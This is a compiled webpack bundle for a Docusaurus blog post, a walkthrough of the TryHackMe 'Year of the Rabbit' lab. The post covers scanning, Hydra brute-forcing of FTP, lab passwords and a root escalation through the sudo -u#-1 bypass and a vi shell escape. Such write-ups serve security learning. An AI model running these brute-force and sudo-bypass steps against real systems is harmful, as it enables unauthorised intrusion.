"use strict";(self.webpackChunkcybersec_notes=self.webpackChunkcybersec_notes||[]).push([[8367],{3905:function(e,t,n){n.d(t,{Zo:function(){return c},kt:function(){return h}});var a=n(7294);function r(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function s(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?s(Object(n),!0).forEach((function(t){r(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):s(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function o(e,t){if(null==e)return{};var n,a,r=function(e,t){if(null==e)return{};var n,a,r={},s=Object.keys(e);for(a=0;a<s.length;a++)n=s[a],t.indexOf(n)>=0||(r[n]=e[n]);return r}(e,t);if(Object.getOwnPropertySymbols){var s=Object.getOwnPropertySymbols(e);for(a=0;a<s.length;a++)n=s[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(r[n]=e[n])}return r}var l=a.createContext({}),p=function(e){var t=a.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):i(i({},t),e)),n},c=function(e){var t=p(e.components);return a.createElement(l.Provider,{value:t},e.children)},u={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},d=a.forwardRef((function(e,t){var n=e.components,r=e.mdxType,s=e.originalType,l=e.parentName,c=o(e,["components","mdxType","originalType","parentName"]),d=p(n),h=r,m=d["".concat(l,".").concat(h)]||d[h]||u[h]||s;return n?a.createElement(m,i(i({ref:t},c),{},{components:n})):a.createElement(m,i({ref:t},c))}));function h(e,t){var n=arguments,r=t&&t.mdxType;if("string"==typeof e||r){var s=n.length,i=new Array(s);i[0]=d;var o={};for(var l in t)hasOwnProperty.call(t,l)&&(o[l]=t[l]);o.originalType=e,o.mdxType="string"==typeof e?e:r,i[1]=o;for(var p=2;p<s;p++)i[p]=n[p];return a.createElement.apply(null,i)}return a.createElement.apply(null,n)}d.displayName="MDXCreateElement"},1843:function(e,t,n){n.r(t),n.d(t,{frontMatter:function(){return o},contentTitle:function(){return l},metadata:function(){return p},assets:function(){return c},toc:function(){return u},default:function(){return h}});var a=n(7462),r=n(3366),s=(n(7294),n(3905)),i=["components"],o={title:"THM Year-of-the-rabbit writeup",description:"Tryhackme Year-of-the-rabbit writeup",image:"https://tryhackme-images.s3.amazonaws.com/room-icons/c062ef0e0b4f70e51a2dafc5fc2bca0e.jpeg",tags:["FTP","stegnography","vi"],authors:["shivam"]},l=void 0,p={permalink:"/Cybernotes/blog/2022/02/26/Yearoftherabbit",source:"@site/blog/2022-02-26-Yearoftherabbit/index.md",title:"THM Year-of-the-rabbit writeup",description:"Tryhackme Year-of-the-rabbit writeup",date:"2022-02-26T00:00:00.000Z",formattedDate:"February 26, 2022",tags:[{label:"FTP",permalink:"/Cybernotes/blog/tags/ftp"},{label:"stegnography",permalink:"/Cybernotes/blog/tags/stegnography"},{label:"vi",permalink:"/Cybernotes/blog/tags/vi"}],readingTime:3.375,truncated:!0,authors:[{name:"0xSH1V4M",title:"Author",url:"https://github.com/shivam1317",imageURL:"https://avatars.githubusercontent.com/u/70281451?v=4",key:"shivam"}],frontMatter:{title:"THM Year-of-the-rabbit writeup",description:"Tryhackme Year-of-the-rabbit writeup",image:"https://tryhackme-images.s3.amazonaws.com/room-icons/c062ef0e0b4f70e51a2dafc5fc2bca0e.jpeg",tags:["FTP","stegnography","vi"],authors:["shivam"]},prevItem:{title:"THM Road writeup",permalink:"/Cybernotes/blog/2022/02/26/Road"},nextItem:{title:"welcome",permalink:"/Cybernotes/blog/welcome"}},c={authorsImageUrls:[void 0]},u=[{value:"nmap results",id:"nmap-results",children:[],level:2},{value:"dirsearch results",id:"dirsearch-results",children:[],level:2},{value:"Stegnography",id:"stegnography",children:[],level:2},{value:"FTP",id:"ftp",children:[],level:2},{value:"SSH",id:"ssh",children:[],level:2},{value:"Privesc",id:"privesc",children:[],level:2}],d={toc:u};function h(e){var t=e.components,o=(0,r.Z)(e,i);return(0,s.kt)("wrapper",(0,a.Z)({},d,o,{components:t,mdxType:"MDXLayout"}),(0,s.kt)("p",null,"Hello everyone,"),(0,s.kt)("p",null,"Today we are going to do Year-of-the-rabbit machine from Tryhackme. we will see some stegnography,some rabbit holes and privesc with vi."),(0,s.kt)("p",null,(0,s.kt)("img",{parentName:"p",src:"https://tryhackme-images.s3.amazonaws.com/room-icons/c062ef0e0b4f70e51a2dafc5fc2bca0e.jpeg",alt:null})),(0,s.kt)("h2",{id:"nmap-results"},"nmap results"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-c"},"Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-02 13:35 EDT\nNmap scan report for 10.10.190.212 (10.10.190.212)\nHost is up (0.16s latency).\nNot shown: 997 closed ports\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.2\n22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)\n| ssh-hostkey:\n|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)\n|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)\n|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)\n|_  256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)\n80/tcp open  http    Apache httpd 2.4.10 ((Debian))\n|_http-server-header: Apache/2.4.10 (Debian)\n|_http-title: Apache2 Debian Default Page: It works\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 17.70 seconds\n")),(0,s.kt)("hr",null),(0,s.kt)("h2",{id:"dirsearch-results"},"dirsearch results"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-c"},"[13:44:08] Starting:\n[13:44:17] 301 -  315B  - /assets  ->  http://10.10.190.212/assets/\n[13:44:31] 200 -    8KB - /index.html\n[13:44:44] 403 -  278B  - /server-status\n")),(0,s.kt)("hr",null),(0,s.kt)("p",null,"--\x3e i got 2 files in ",(0,s.kt)("inlineCode",{parentName:"p"},"/assets")),(0,s.kt)("p",null,(0,s.kt)("img",{src:n(9820).Z,width:"1055",height:"515"})),(0,s.kt)("p",null,"--\x3e first video was rickroll and i found one comment in ",(0,s.kt)("inlineCode",{parentName:"p"},"style.css")," file"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-py"}," Nice to see someone checking the stylesheets.\n Take a look at the page: /sup3r_s3cr3t_fl4g.php\n")),(0,s.kt)("p",null,"--\x3e when i goto this file i got one alert saying"),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"disable javascript")),(0,s.kt)("p",null,"so i disabled javascript and found this :"),(0,s.kt)("p",null,(0,s.kt)("img",{src:n(2933).Z,width:"1673",height:"741"})),(0,s.kt)("p",null,"--\x3e and this time there was a directory called ",(0,s.kt)("inlineCode",{parentName:"p"},"sup3r_s3cr3t_fl4g")),(0,s.kt)("p",null,"--\x3e so i ran dirsearch on this and found only ",(0,s.kt)("inlineCode",{parentName:"p"},"index.html")),(0,s.kt)("p",null,"--\x3e i found this hidden directory after intercepting the response"),(0,s.kt)("p",null,(0,s.kt)("img",{src:n(1114).Z,width:"953",height:"281"})),(0,s.kt)("p",null,"--\x3e after going to this directory i found one image and when i done ",(0,s.kt)("inlineCode",{parentName:"p"},"strings <image>")," then i found this :"),(0,s.kt)("p",null,(0,s.kt)("img",{src:n(4340).Z,width:"1853",height:"595"})),(0,s.kt)("hr",null),(0,s.kt)("h2",{id:"stegnography"},"Stegnography"),(0,s.kt)("p",null,"--\x3e and the text after ",(0,s.kt)("inlineCode",{parentName:"p"},"One of these is the password:")," is not the exifdata but it's actully the list of passwords !"),(0,s.kt)("p",null,"so we have to use them as a wordlist for hydra"),(0,s.kt)("p",null,"--\x3e so Let's brute force the ftp password for ",(0,s.kt)("inlineCode",{parentName:"p"},"ftpuser")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-bash"},"\u250c\u2500\u2500(kali\u327fkali)-[~/Documents/THM/Yearoftherabbit]\n\u2514\u2500$ hydra -l ftpuser -P wordlist.txt ftp://10.10.190.212\nHydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-09-02 14:41:00\n[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 82 login tries (l:1/p:82), ~6 tries per task\n[DATA] attacking ftp://10.10.190.212:21/\n[21][ftp] host: 10.10.190.212   login: ftpuser   password: 5iez1wGXKfPKQ\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-09-02 14:41:26\n")),(0,s.kt)("p",null,"--\x3e and i got password !"),(0,s.kt)("p",null,"--\x3e so Let's login on ftp !"),(0,s.kt)("hr",null),(0,s.kt)("h2",{id:"ftp"},"FTP"),(0,s.kt)("p",null,"--\x3e got this in ftp"),(0,s.kt)("p",null,(0,s.kt)("img",{src:n(3684).Z,width:"953",height:"335"})),(0,s.kt)("p",null,"--\x3e This is ",(0,s.kt)("inlineCode",{parentName:"p"},"brainfuck")," lanugage so Let's decode it !"),(0,s.kt)("p",null,"--\x3e and i got the password for ",(0,s.kt)("inlineCode",{parentName:"p"},"eli")," and it must be a SSH password"),(0,s.kt)("p",null,(0,s.kt)("img",{src:n(3794).Z,width:"543",height:"215"})),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-c"},"eli:DSpDiM1wAEwid\n")),(0,s.kt)("hr",null),(0,s.kt)("h2",{id:"ssh"},"SSH"),(0,s.kt)("p",null,"--\x3e when we will login with ssh then i got this message"),(0,s.kt)("p",null,(0,s.kt)("img",{src:n(6025).Z,width:"1499",height:"459"})),(0,s.kt)("p",null,"--\x3e then i done ",(0,s.kt)("inlineCode",{parentName:"p"},"locate s3cr3t")," and found one directory"),(0,s.kt)("p",null,(0,s.kt)("img",{src:n(3658).Z,width:"1201",height:"217"})),(0,s.kt)("p",null,"--\x3e so Let's read that file"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-c"},"Your password is awful, Gwendoline.\nIt should be at least 60 characters long! Not just MniVCQVhQHUNI\nHonestly!\n\nYours sincerely\n   -Root\n")),(0,s.kt)("p",null,"--\x3e so now we have password of gwendoline so Let's login"),(0,s.kt)("p",null,"--\x3e and we got logged in and got ",(0,s.kt)("inlineCode",{parentName:"p"},"user.txt")),(0,s.kt)("hr",null),(0,s.kt)("h2",{id:"privesc"},"Privesc"),(0,s.kt)("p",null,"when i done ",(0,s.kt)("inlineCode",{parentName:"p"},"sudo -l")," i found this :"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-c"},"Matching Defaults entries for gwendoline on year-of-the-rabbit:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser gwendoline may run the following commands on year-of-the-rabbit:\n    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt\n")),(0,s.kt)("p",null,"--\x3e it means we can run ",(0,s.kt)("inlineCode",{parentName:"p"},"vi"),"as every user except root so we have to find something to bypass this because we want root shell"),(0,s.kt)("p",null,"--\x3e after some research i found this exploit from exploit-db"),(0,s.kt)("p",null,(0,s.kt)("a",{parentName:"p",href:"https://www.exploit-db.com/exploits/47502"},"https://www.exploit-db.com/exploits/47502")),(0,s.kt)("p",null,"--\x3e so i made this command"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-c"},"sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt\n")),(0,s.kt)("p",null,"--\x3e after that press ",(0,s.kt)("inlineCode",{parentName:"p"},"shift+;")," and then write ",(0,s.kt)("inlineCode",{parentName:"p"},"!/bin/bash")," and you will get root shell !"),(0,s.kt)("hr",null))}h.isMDXComponent=!0},9820:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20210902140443-67dfacd645647070ecbef1d435c0c7d2.png"},2933:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20210902140740-c869fe12d3144d9c0d4897dc41d99ead.png"},1114:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20210902143034-213a3dd9a5573120ccf1c82fb249029d.png"},4340:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20210902144212-c0a36854f7caa341a7c98502c7c43c28.png"},3684:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20210902144533-c6f7654dad3cb7a615cec24109ef56b2.png"},3794:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20210902144640-93e37c0d58385c510a707240792725ef.png"},6025:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20210903114342-9d5815949b505b33d390d57b2fa700c1.png"},3658:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20210903114446-81c47229b0544cee603df5dc8dcdb43c.png"}}]);